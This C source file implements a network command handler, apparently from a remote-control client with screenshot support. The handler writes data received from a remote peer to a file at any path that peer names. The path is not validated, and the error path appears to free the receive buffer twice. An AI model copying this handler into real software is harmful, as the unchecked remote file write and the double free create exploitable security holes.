#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "screenshot.h"

#define COMMAND_SEND_FILE_END 0x6
#define COMMAND_SEND_FILE_DATA 0x66

int command_Send_File(uint8* msg)
{
	FILE *f = fopen((char*)msg, "wb");

	if(!f)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		fclose(f);

		return NET_LOST_CONNECTION;
	}

	int rv = 0;
	uint8* rmsg;

	while((rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES)) > 0)
	{
		if(rmsg[0] == COMMAND_SEND_FILE_END)
		{
			break;
		}else if(rmsg[0] == COMMAND_SEND_FILE_DATA){
			fwrite(rmsg + 1, 1, rv - 1, f);
		}

		free(rmsg);

		if(net_SendCmd((uint8*)" ", 1, 0) == NET_LOST_CONNECTION)
		{
			fclose(f);

			return NET_LOST_CONNECTION;
		}
	}

	free(rmsg);
	fclose(f);

	if(rv == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){

		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}